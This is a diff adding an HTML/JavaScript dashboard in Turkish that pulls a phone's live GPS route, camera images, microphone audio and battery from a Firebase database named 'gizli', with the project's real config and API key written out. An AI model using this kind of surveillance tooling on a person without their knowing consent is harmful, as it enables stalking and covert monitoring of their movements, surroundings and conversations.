@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🖥️ Uzaktan Erişim - Kontrol Paneli</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0a0a0f;
+            color: #fff;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .app {
+            display: grid;
+            grid-template-columns: 400px 1fr;
+            height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background: #12121a;
+            border-right: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .sidebar-header {
+            padding: 24px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+
+        .logo-icon {
+            width: 50px; height: 50px;
+            background: linear-gradient(135deg, #00d9ff, #00ff88);
+            border-radius: 14px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 24px;
+        }
+
+        .logo h1 { font-size: 1.3rem; font-weight: 600; }
+        .logo p { font-size: 0.8rem; color: #666; }
+
+        .connect-box {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 14px;
+            padding: 20px;
+        }
+
+        .connect-box label {
+            display: block; font-size: 0.75rem;
+            text-transform: uppercase; letter-spacing: 1px;
+            color: #666; margin-bottom: 10px;
+        }
+
+        .input-row { display: flex; gap: 10px; }
+
+        .connect-box input {
+            flex: 1; padding: 14px 16px;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            color: #fff; font-size: 1.1rem;
+            text-align: center; letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        .connect-box input:focus { outline: none; border-color: #00ff88; }
+
+        .btn {
+            padding: 14px 20px;
+            border: none; border-radius: 10px;
+            font-weight: 600; cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-connect {
+            background: linear-gradient(135deg, #00ff88, #00d9ff);
+            color: #0a0a0f;
+        }
+
+        .btn-connect:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
+        }
+
+        /* Durum */
+        .status-section {
+            padding: 20px 24px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .status-card {
+            display: flex; align-items: center; gap: 14px;
+            padding: 16px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 12px;
+        }
+
+        .status-dot {
+            width: 14px; height: 14px;
+            border-radius: 50%;
+            background: #444;
+        }
+
+        .status-dot.online {
+            background: #00ff88;
+            box-shadow: 0 0 15px #00ff88;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .status-info { flex: 1; }
+        .status-info strong { display: block; margin-bottom: 2px; }
+        .status-info span { font-size: 0.8rem; color: #666; }
+
+        .status-battery {
+            font-size: 1.1rem; font-weight: 600; color: #00ff88;
+        }
+
+        /* Kamera + Ses Bölümü */
+        .media-section {
+            padding: 20px 24px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .section-title {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #666;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .camera-feed {
+            width: 100%;
+            aspect-ratio: 4/3;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .camera-feed img {
+            width: 100%; height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-placeholder {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            color: #444;
+        }
+
+        .camera-placeholder span { font-size: 48px; margin-bottom: 10px; }
+
+        /* Ses Oynatıcı */
+        .audio-section {
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+        }
+
+        .audio-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .audio-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .audio-status {
+            font-size: 0.75rem;
+            color: #00ff88;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .audio-status .live-dot {
+            width: 8px; height: 8px;
+            background: #00ff88;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .audio-controls {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .audio-btn {
+            width: 50px; height: 50px;
+            background: linear-gradient(135deg, #00ff88, #00d9ff);
+            border: none;
+            border-radius: 50%;
+            color: #0a0a0f;
+            font-size: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .audio-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+        }
+
+        .audio-btn:disabled {
+            background: #333;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .audio-visualizer {
+            flex: 1;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 3px;
+        }
+
+        .audio-bar {
+            width: 4px;
+            background: #00ff88;
+            border-radius: 2px;
+            transition: height 0.1s;
+        }
+
+        .volume-control {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .volume-control input[type="range"] {
+            width: 80px;
+            height: 4px;
+            -webkit-appearance: none;
+            background: rgba(255,255,255,0.2);
+            border-radius: 2px;
+        }
+
+        .volume-control input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 14px; height: 14px;
+            background: #00ff88;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        /* Konum Bilgileri */
+        .location-section {
+            padding: 20px 24px;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .info-item {
+            background: rgba(255,255,255,0.03);
+            border-radius: 10px;
+            padding: 14px;
+            text-align: center;
+        }
+
+        .info-item label {
+            display: block; font-size: 0.65rem;
+            text-transform: uppercase; color: #555;
+            margin-bottom: 4px;
+        }
+
+        .info-item span {
+            font-family: 'SF Mono', monospace;
+            font-size: 0.9rem; color: #00ff88;
+        }
+
+        /* Ana içerik - Harita */
+        .main-content { position: relative; }
+
+        #map { width: 100%; height: 100%; }
+
+        .leaflet-container { background: #0a0a0f; }
+
+        .map-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(10, 10, 15, 0.95);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 1000;
+        }
+
+        .map-overlay.hidden { display: none; }
+
+        .overlay-content { text-align: center; max-width: 400px; }
+
+        .overlay-icon {
+            width: 100px; height: 100px;
+            background: rgba(0, 255, 136, 0.1);
+            border: 2px solid #00ff88;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 48px;
+            animation: ring 2s infinite;
+        }
+
+        @keyframes ring {
+            0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); }
+            70% { box-shadow: 0 0 0 30px rgba(0, 255, 136, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
+        }
+
+        .overlay-content h2 { font-size: 1.5rem; margin-bottom: 12px; }
+        .overlay-content p { color: #666; line-height: 1.8; }
+        .overlay-content strong { color: #00ff88; }
+
+        .map-controls {
+            position: absolute;
+            top: 20px; right: 20px;
+            display: flex; flex-direction: column;
+            gap: 8px; z-index: 500;
+        }
+
+        .map-btn {
+            width: 46px; height: 46px;
+            background: #12121a;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: #888; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 20px;
+            transition: all 0.2s;
+        }
+
+        .map-btn:hover {
+            background: #00ff88;
+            color: #0a0a0f;
+            border-color: #00ff88;
+        }
+
+        /* Custom Marker */
+        .custom-marker { background: none; border: none; }
+
+        .marker-wrapper { width: 50px; height: 50px; position: relative; }
+
+        .marker-pulse {
+            position: absolute;
+            width: 50px; height: 50px;
+            background: #00ff88;
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: marker-pulse 2s infinite;
+        }
+
+        @keyframes marker-pulse {
+            0% { transform: scale(0.5); opacity: 0.5; }
+            100% { transform: scale(1.5); opacity: 0; }
+        }
+
+        .marker-dot {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px; height: 20px;
+            background: #00ff88;
+            border: 3px solid white;
+            border-radius: 50%;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.5);
+        }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .app {
+                grid-template-columns: 1fr;
+                grid-template-rows: auto 1fr;
+            }
+            .sidebar { max-height: 50vh; overflow-y: auto; }
+        }
+    </style>
+</head>
+<body>
+    <div class="app">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">
+                    <div class="logo-icon">🖥️</div>
+                    <div>
+                        <h1>Uzaktan Erişim</h1>
+                        <p>Telefon Kontrol Paneli</p>
+                    </div>
+                </div>
+
+                <div class="connect-box">
+                    <label>Bağlantı Kodu</label>
+                    <div class="input-row">
+                        <input type="text" id="codeInput" placeholder="abc123" maxlength="8">
+                        <button class="btn btn-connect" id="connectBtn">Bağlan</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="status-section">
+                <div class="status-card">
+                    <div class="status-dot" id="statusDot"></div>
+                    <div class="status-info">
+                        <strong id="statusText">Bağlantı Bekleniyor</strong>
+                        <span id="statusTime">--:--</span>
+                    </div>
+                    <div class="status-battery" id="batteryDisplay">--%</div>
+                </div>
+            </div>
+
+            <div class="media-section">
+                <div class="section-title">📷 Kamera Görüntüsü</div>
+                <div class="camera-feed">
+                    <img id="cameraImage" src="" alt="Kamera" style="display: none;">
+                    <div class="camera-placeholder" id="cameraPlaceholder">
+                        <span>📷</span>
+                        <p>Kamera bekleniyor...</p>
+                    </div>
+                </div>
+
+                <div class="audio-section">
+                    <div class="audio-header">
+                        <div class="audio-title">🎤 Canlı Ses</div>
+                        <div class="audio-status" id="audioStatus">
+                            <div class="live-dot"></div>
+                            <span>Bekleniyor</span>
+                        </div>
+                    </div>
+                    <div class="audio-controls">
+                        <button class="audio-btn" id="playAudioBtn" disabled title="Sesi Oynat">
+                            🔊
+                        </button>
+                        <div class="audio-visualizer" id="audioVisualizer">
+                            <div class="audio-bar" style="height: 10px;"></div>
+                            <div class="audio-bar" style="height: 15px;"></div>
+                            <div class="audio-bar" style="height: 20px;"></div>
+                            <div class="audio-bar" style="height: 12px;"></div>
+                            <div class="audio-bar" style="height: 18px;"></div>
+                            <div class="audio-bar" style="height: 25px;"></div>
+                            <div class="audio-bar" style="height: 15px;"></div>
+                            <div class="audio-bar" style="height: 10px;"></div>
+                        </div>
+                        <div class="volume-control">
+                            <span>🔉</span>
+                            <input type="range" id="volumeSlider" min="0" max="100" value="80">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="location-section">
+                <div class="section-title">📍 Konum Bilgileri</div>
+                <div class="info-grid">
+                    <div class="info-item">
+                        <label>Enlem</label>
+                        <span id="latDisplay">--</span>
+                    </div>
+                    <div class="info-item">
+                        <label>Boylam</label>
+                        <span id="lngDisplay">--</span>
+                    </div>
+                    <div class="info-item">
+                        <label>Hassasiyet</label>
+                        <span id="accDisplay">--</span>
+                    </div>
+                    <div class="info-item">
+                        <label>Hız</label>
+                        <span id="speedDisplay">--</span>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <div id="map"></div>
+
+            <div class="map-overlay" id="mapOverlay">
+                <div class="overlay-content">
+                    <div class="overlay-icon">📱</div>
+                    <h2>Telefon Bağlantısı Bekleniyor</h2>
+                    <p>
+                        1. Telefonunuzda <strong>tracker.html</strong> açın<br>
+                        2. Bir bağlantı kodu girin<br>
+                        3. Aynı kodu buraya girin ve <strong>Bağlan</strong>'a tıklayın
+                    </p>
+                </div>
+            </div>
+
+            <div class="map-controls">
+                <button class="map-btn" id="centerBtn" title="Konuma Git">🎯</button>
+                <button class="map-btn" id="zoomInBtn" title="Yakınlaştır">➕</button>
+                <button class="map-btn" id="zoomOutBtn" title="Uzaklaştır">➖</button>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Firebase Config - GERÇEK PROJE
+        const firebaseConfig = {
+            apiKey: "AIzaSyDR9gR5nhJ2Y2nNLBKwK7IiAr1_KVWjHSw",
+            authDomain: "gizli-38804.firebaseapp.com",
+            databaseURL: "https://gizli-38804-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "gizli-38804",
+            storageBucket: "gizli-38804.firebasestorage.app",
+            messagingSenderId: "653791348128",
+            appId: "1:653791348128:web:ac6502b2692441b99610c5"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        class Dashboard {
+            constructor() {
+                this.map = null;
+                this.marker = null;
+                this.polyline = null;
+                this.code = '';
+                this.isConnected = false;
+                this.routePoints = [];
+                this.listeners = [];
+                this.audioQueue = [];
+                this.isPlaying = false;
+                this.volume = 0.8;
+
+                this.init();
+            }
+
+            init() {
+                this.initMap();
+                this.bindEvents();
+
+                const saved = localStorage.getItem('dashboard_code');
+                if (saved) document.getElementById('codeInput').value = saved;
+            }
+
+            initMap() {
+                this.map = L.map('map', {
+                    center: [39.0, 35.0],
+                    zoom: 6,
+                    zoomControl: false
+                });
+
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                    attribution: '&copy; CARTO',
+                    subdomains: 'abcd',
+                    maxZoom: 19
+                }).addTo(this.map);
+
+                this.polyline = L.polyline([], {
+                    color: '#00ff88',
+                    weight: 3,
+                    opacity: 0.7
+                }).addTo(this.map);
+            }
+
+            bindEvents() {
+                document.getElementById('connectBtn').addEventListener('click', () => this.connect());
+                document.getElementById('codeInput').addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') this.connect();
+                });
+
+                document.getElementById('centerBtn').addEventListener('click', () => this.centerMap());
+                document.getElementById('zoomInBtn').addEventListener('click', () => this.map.zoomIn());
+                document.getElementById('zoomOutBtn').addEventListener('click', () => this.map.zoomOut());
+
+                document.getElementById('playAudioBtn').addEventListener('click', () => this.toggleAudio());
+                document.getElementById('volumeSlider').addEventListener('input', (e) => {
+                    this.volume = e.target.value / 100;
+                });
+            }
+
+            connect() {
+                this.code = document.getElementById('codeInput').value.trim().toLowerCase();
+
+                if (!this.code) {
+                    alert('Lütfen bağlantı kodunu girin.');
+                    return;
+                }
+
+                localStorage.setItem('dashboard_code', this.code);
+
+                this.listeners.forEach(ref => ref.off());
+                this.listeners = [];
+
+                this.listenToDevice();
+
+                document.getElementById('connectBtn').textContent = 'Bağlanıyor...';
+            }
+
+            listenToDevice() {
+                const deviceRef = db.ref('devices/' + this.code);
+
+                // Durum
+                const statusRef = deviceRef.child('status');
+                statusRef.on('value', (snap) => {
+                    const status = snap.val();
+                    this.updateConnectionStatus(status === 'online');
+                });
+                this.listeners.push(statusRef);
+
+                // Konum
+                const locRef = deviceRef.child('location');
+                locRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data) this.updateLocation(data);
+                });
+                this.listeners.push(locRef);
+
+                // Kamera
+                const camRef = deviceRef.child('camera');
+                camRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data && data.image) this.updateCamera(data.image);
+                });
+                this.listeners.push(camRef);
+
+                // Pil
+                const batRef = deviceRef.child('battery');
+                batRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data) this.updateBattery(data);
+                });
+                this.listeners.push(batRef);
+
+                // Ses
+                const audioRef = deviceRef.child('audio');
+                audioRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data && data.data) this.handleAudioData(data.data);
+                });
+                this.listeners.push(audioRef);
+            }
+
+            updateConnectionStatus(online) {
+                const dot = document.getElementById('statusDot');
+                const text = document.getElementById('statusText');
+                const btn = document.getElementById('connectBtn');
+                const audioBtn = document.getElementById('playAudioBtn');
+
+                if (online) {
+                    dot.classList.add('online');
+                    text.textContent = 'Bağlı';
+                    btn.textContent = 'Bağlandı ✓';
+                    audioBtn.disabled = false;
+                    document.getElementById('mapOverlay').classList.add('hidden');
+                    document.getElementById('audioStatus').querySelector('span').textContent = 'Aktif';
+                    this.isConnected = true;
+                } else {
+                    dot.classList.remove('online');
+                    text.textContent = 'Çevrimdışı';
+                    btn.textContent = 'Bağlan';
+                    audioBtn.disabled = true;
+                    document.getElementById('audioStatus').querySelector('span').textContent = 'Bekleniyor';
+                    this.isConnected = false;
+                }
+            }
+
+            updateLocation(data) {
+                const { lat, lng, accuracy, speed, timestamp } = data;
+
+                document.getElementById('latDisplay').textContent = lat.toFixed(6);
+                document.getElementById('lngDisplay').textContent = lng.toFixed(6);
+                document.getElementById('accDisplay').textContent = Math.round(accuracy) + ' m';
+                document.getElementById('speedDisplay').textContent = speed ? (speed * 3.6).toFixed(1) + ' km/s' : '0 km/s';
+                document.getElementById('statusTime').textContent = new Date(timestamp).toLocaleTimeString('tr-TR');
+
+                this.updateMarker(lat, lng);
+                this.addToRoute(lat, lng);
+
+                if (this.routePoints.length === 1) {
+                    this.centerMap();
+                }
+            }
+
+            updateMarker(lat, lng) {
+                const latlng = [lat, lng];
+
+                if (!this.marker) {
+                    const html = `
+                        <div class="marker-wrapper">
+                            <div class="marker-pulse"></div>
+                            <div class="marker-dot"></div>
+                        </div>
+                    `;
+
+                    const icon = L.divIcon({
+                        html,
+                        className: 'custom-marker',
+                        iconSize: [50, 50],
+                        iconAnchor: [25, 25]
+                    });
+
+                    this.marker = L.marker(latlng, { icon }).addTo(this.map);
+                } else {
+                    this.marker.setLatLng(latlng);
+                }
+            }
+
+            addToRoute(lat, lng) {
+                const last = this.routePoints[this.routePoints.length - 1];
+                if (last && last[0] === lat && last[1] === lng) return;
+
+                this.routePoints.push([lat, lng]);
+                this.polyline.setLatLngs(this.routePoints);
+            }
+
+            updateCamera(imageData) {
+                const img = document.getElementById('cameraImage');
+                const placeholder = document.getElementById('cameraPlaceholder');
+
+                img.src = imageData;
+                img.style.display = 'block';
+                placeholder.style.display = 'none';
+            }
+
+            updateBattery(data) {
+                const display = document.getElementById('batteryDisplay');
+                display.textContent = data.level + '%' + (data.charging ? '⚡' : '');
+            }
+
+            handleAudioData(base64Data) {
+                this.audioQueue.push(base64Data);
+                
+                if (this.isPlaying) {
+                    this.playNextAudio();
+                }
+
+                this.animateVisualizer();
+            }
+
+            toggleAudio() {
+                const btn = document.getElementById('playAudioBtn');
+                
+                if (this.isPlaying) {
+                    this.isPlaying = false;
+                    btn.textContent = '🔊';
+                    btn.style.background = 'linear-gradient(135deg, #00ff88, #00d9ff)';
+                } else {
+                    this.isPlaying = true;
+                    btn.textContent = '🔇';
+                    btn.style.background = '#ff4d4d';
+                    this.playNextAudio();
+                }
+            }
+
+            playNextAudio() {
+                if (!this.isPlaying || this.audioQueue.length === 0) return;
+
+                const audioData = this.audioQueue.shift();
+                
+                try {
+                    const audio = new Audio(audioData);
+                    audio.volume = this.volume;
+                    
+                    audio.onended = () => {
+                        this.playNextAudio();
+                    };
+                    
+                    audio.onerror = () => {
+                        this.playNextAudio();
+                    };
+
+                    audio.play().catch(() => {
+                        this.playNextAudio();
+                    });
+                } catch (e) {
+                    console.error('Ses oynatma hatası:', e);
+                    this.playNextAudio();
+                }
+            }
+
+            animateVisualizer() {
+                const bars = document.querySelectorAll('.audio-bar');
+                bars.forEach(bar => {
+                    const height = Math.random() * 25 + 5;
+                    bar.style.height = height + 'px';
+                });
+            }
+
+            centerMap() {
+                if (this.routePoints.length > 0) {
+                    const last = this.routePoints[this.routePoints.length - 1];
+                    this.map.setView(last, 16, { animate: true });
+                }
+            }
+        }
+
+        new Dashboard();
+    </script>
+</body>
+</html>
